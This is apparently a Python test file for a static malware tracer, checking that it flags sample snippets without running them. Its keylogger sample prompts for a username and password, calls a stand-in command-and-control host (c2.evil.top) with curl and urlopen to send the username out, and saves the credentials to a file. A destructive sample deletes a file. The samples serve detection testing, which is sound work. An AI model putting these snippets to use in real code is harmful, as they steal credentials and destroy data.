import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.stdout.reconfigure(encoding="utf-8")

from core import tracer

SENTINEL_FILE = Path(tempfile.gettempdir()) / "_tracer_must_not_exist.txt"


def _scan(code):
    fh = tempfile.NamedTemporaryFile("w", suffix=".py", delete=False, encoding="utf-8")
    fh.write(code)
    fh.close()
    try:
        return tracer.trace(fh.name)
    finally:
        Path(fh.name).unlink(missing_ok=True)


def check(label, got, expected):
    assert got == expected, f"{label}: esperado {expected}, obtenido {got}"
    print(f"OK  {label} -> {got}")


KEYLOGGER = (
    "import os\n"
    "import subprocess\n"
    "from urllib.request import urlopen\n"
    "\n"
    "def exfiltrate():\n"
    "    user = input('usuario: ')\n"
    "    pw = input('password: ')\n"
    "    os.system('whoami')\n"
    "    subprocess.run(['curl', 'http://c2.evil.top/gate.php'])\n"
    "    urlopen('http://c2.evil.top/gate.php?u=' + user)\n"
    "    with open('stolen.txt', 'w') as f:\n"
    "        f.write(user + pw)\n"
    "    data = compile('1+1', '<x>', 'eval')\n"
    "\n"
    "exfiltrate()\n"
)

SENTINEL_FILE.write_bytes(b"pre-existente")

DESTRUCTIVE = (
    "import os\n"
    f"os.remove(r'{SENTINEL_FILE}')\n"
    "os.system('echo PWNED > ' + r'" + str(SENTINEL_FILE) + "')\n"
)

result = _scan(DESTRUCTIVE)

check("no ejecuta os.remove (archivo intacto)", SENTINEL_FILE.exists(), True)
events = {e["evento"] for e in result["events"]}
check("registra file_delete", "file_delete" in events, True)
check("registra exec_command", "exec_command" in events, True)
check("estado destructivo", result["estado"], "alerta")
SENTINEL_FILE.unlink(missing_ok=True)

kl = _scan(KEYLOGGER)
ev = {e["evento"] for e in kl["events"]}
check("keylogger: input capturado", "credential_input" in ev, True)
check("keylogger: exec_command", "exec_command" in ev, True)
check("keylogger: exec_process", "exec_process" in ev, True)
check("keylogger: red", "network" in ev, True)
check("keylogger: escritura", "file_write" in ev, True)
check("keylogger: dynamic_exec", "dynamic_exec" in ev, True)
check("keylogger estado", kl["estado"], "alerta")
check("keylogger findings con mitre",
      all(f.get("mitre_id") for f in kl["findings"]), True)

kl_line = next(e for e in kl["events"] if e["evento"] == "exec_command")
check("keylogger linea os.system", kl_line["line"], 8)

safe = _scan("x = 1 + 1\ny = x * 2\nprint(y)\n")
check("codigo seguro sin eventos", safe["events"], [])
check("codigo seguro estado", safe["estado"], "limpio")

broken = _scan("def f(:\n  pass\n")
check("sintaxis rota", broken["estado"], "pendiente")

print("\nTodos los casos del tracer pasaron.")
